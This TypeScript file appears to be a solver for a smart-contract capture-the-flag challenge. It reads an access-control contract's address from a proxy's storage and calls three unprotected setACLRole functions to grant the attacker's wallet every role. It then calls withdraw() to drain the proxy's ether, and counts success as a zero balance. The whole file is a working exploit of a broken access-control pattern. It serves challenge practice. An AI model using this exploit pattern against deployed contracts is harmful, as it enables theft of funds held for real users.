import { SolCompiler } from '../../../lib/compiler';
import { Sender } from '../../../lib/sender';
import setting from '../setting.json';
import BN from 'bn.js';
import Web3 from 'web3';

const abi = require('ethereumjs-abi');
const web3 = new Web3();

// const input = (findFileContent: any): any => {
//     return {
//         language: 'Solidity',
//         sources: {
//             // //  public/<FILE_NAME>.sol
//             // 'public/Setup.sol': {
//             //     content: findFileContent('public/Setup.sol')
//             // },
//             // 'public/Hello.sol': {
//             //     content: findFileContent('public/Hello.sol')
//             // },

//             //  private/<FILE_NAME>.sol
//             'private/Exploit.sol': {
//                 content: findFileContent('private/Exploit.sol')
//             },
//         },
//         settings: {
//             outputSelection: {
//                 '*': {
//                     '*': ['*']
//                 }
//             }
//         }
//     }
// }

/**
 * 
 * @param exploiter 
 * @param version 
 * @param proxyAddress 
 * @param valueEth 
 * @returns true if solved, false otherwise.
 */
export const solve = async (exploiter: Sender, proxyAddress: string): Promise<boolean> => {
    
    console.log('exploiter balance: ', await exploiter.balance('ether'));
    const beforeBalance = await exploiter.getBalance(proxyAddress, 'ether');
    console.log('proxy balance: ', beforeBalance);
    
    const aclAddress = await exploiter.getStorageAt(proxyAddress, new BN(0));
    const aclBalance = await exploiter.getBalance(aclAddress, 'ether');
    console.log('ACL address: ', aclAddress);
    console.log('ACL balance: ', aclBalance);

    {
        {
            const data = abi.simpleEncode("setACLRole7123909213907581092(address)", exploiter.wallet.getChecksumAddressString());
            const res = await exploiter.callContract(aclAddress, data);
            console.log(res);
        }
        {
            const data = abi.simpleEncode("setACLRole8972381298910001230(address)", exploiter.wallet.getChecksumAddressString());
            const res = await exploiter.callContract(aclAddress, data);
            console.log(res);
        }
        {
            const data = abi.simpleEncode("setACLRole5999294130779334338(address)", exploiter.wallet.getChecksumAddressString());
            const res = await exploiter.callContract(aclAddress, data);
            console.log(res);
        }
    }
    {
        {
            const res = await exploiter.getStorageAt(aclAddress, new BN(1));
            console.log('Role712:', res);
        }
        {
            const res = await exploiter.getStorageAt(aclAddress, new BN(2));
            console.log('Role897:', res);
        }
        {
            const res = await exploiter.getStorageAt(aclAddress, new BN(0));
            console.log('Role599:', res);
        }
    }
    
    {
        const data = abi.simpleEncode("balance()");
        const res = await exploiter.viewContract(proxyAddress, data);
        console.log('balance:', web3.utils.hexToNumberString(res));
    }

    const data = abi.simpleEncode("withdraw()");
    const res = await exploiter.callContract(proxyAddress, data, { value: '2000', unit: 'finney'});
    console.log('withdraw() called:', res);

    console.log('exploiter balance: ', await exploiter.balance('ether'));
    const afterBalance = await exploiter.getBalance(proxyAddress, 'ether');
    console.log(`====== proxy balance ======`);
    console.log(' - before: ', beforeBalance);
    console.log(' - after : ', afterBalance);
    return afterBalance == '0';
}